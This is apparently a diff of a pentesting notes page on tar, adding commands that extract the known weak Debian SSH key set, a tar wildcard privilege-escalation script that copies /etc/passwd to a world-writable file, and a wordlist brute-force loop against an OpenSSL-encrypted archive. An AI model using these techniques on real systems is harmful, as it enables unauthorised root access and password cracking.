@@ -9,6 +9,32 @@ hideFooterPagination: true
 
 {/* Generated from Commands/tar.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## tar: choose the operation and read the result
+
+Commands and examples collected from your tar notes.
+
+### What the result establishes
+
+List archive members before extracting and verify the destination and preserved metadata.
+
+### Prerequisites and common failures
+
+Archive paths and symlinks can affect where files land; extracting is a filesystem write, unlike listing contents.
+
+### Example 1: SSH Key Predictable PRNG (Authorized_Keys) Process
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```ps1
+git clone https://github.com/g0tmi1k/debian-ssh
+cd debian-ssh
+tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your tar notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=tar) · [All tools](/index)
 
 ## SSH Key Predictable PRNG (Authorized_Keys) Process
@@ -20,6 +46,13 @@ git clone https://github.com/g0tmi1k/debian-ssh
 cd debian-ssh
 tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — SSH Key Predictable PRNG (Authorized_Keys) Process](/privesc/linux-privesc-checklist#ssh-key-predictable-prng-authorized_keys-process)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -47,6 +80,13 @@ echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh
 tar cf archive.tar *
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Wildcard](/privesc/linux-privesc-checklist#wildcard)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="OpenSSL-encrypted GZIP (.gzip that isn&#x27;t really gzip)">
@@ -60,6 +100,22 @@ for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2
 ls    # a new extracted file appears if a password worked
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/enumeration/citrix-netscaler#example-6-openssl-encrypted-gzip-gzip-that-isnt-really-gzip) · [Read and Search Email with POP3 and IMAP — Example 6: OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/enumeration/email-enumeration-manipulation-pop3-imap#example-6-openssl-encrypted-gzip-gzip-that-isnt-really-gzip) · [Password Attacks: Cracking, Files, and Credential Stores — OpenSSL-encrypted GZIP (.gzip that isn't really gzip)](/password-attacks/password-attacks-cheat-sheet#openssl-encrypted-gzip-gzip-that-isnt-really-gzip)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Linux Privilege Escalation: Full Checklist](/privesc/linux-privesc-checklist)
+- [Password Attacks: Cracking, Files, and Credential Stores](/password-attacks/password-attacks-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
